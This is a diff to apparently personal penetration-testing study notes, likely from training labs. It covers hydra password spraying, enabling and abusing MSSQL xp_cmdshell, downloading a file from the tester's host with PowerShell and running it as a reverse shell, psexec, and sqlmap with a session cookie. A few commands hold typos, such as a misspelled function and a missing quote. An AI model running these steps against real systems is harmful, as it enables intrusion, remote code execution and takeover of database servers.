@@ -228,3 +228,60 @@ password spraying
 service [ssh, ftp, etc.]
 
 hydra -L users.txt -p 'funnel123#!#' 10.129.228.195 ssh
+
+----------------------------------------------------
+connecto to microsoft sql server
+
+with the mssqlclient.py script from impacket you can connect to a sql client
+
+python3 mssqlclient DOMAIN/user@ip
+
+microsoft sql commands
+
+help [shows info of available commands]
+
+in order to check what role we have in the server we use
+
+SELECT is_srvrolmeber('sysadmin);
+ if 1 then we are
+
+to check if shell is available to us for use
+
+EXEC xp_cmdshell 'net user';
+
+if cmd shell is not usable we do the following
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1;
+
+then
+
+xp_cmdshell "whoami";
+
+to upload a file to a windows system to a specific path
+
+xp_cmdshell "powershell -c cd C:\Users\<username>\Downloads; wget http://<your ip>/<file> -outfile <name of the file in the target machine>"
+
+execute the file
+
+xp_cmdshell "powershell -c cd C:\Users\<username>\Downloads; .\<file> -e <service to bind> <your ip> <your port>"
+
+if you have the admin credentials use this instead
+python3 psexec administrator@ip
+
+-----------------------------------------------
+burpsuite
+
+-----------------------------------------------
+sqlmap
+
+to automatize sql injections we use the sqlmap tool
+
+example
+
+sqlmap -u '<url/path-to-something>' --cookie="<cookieuser>=<cookievalue>"
+
+
+
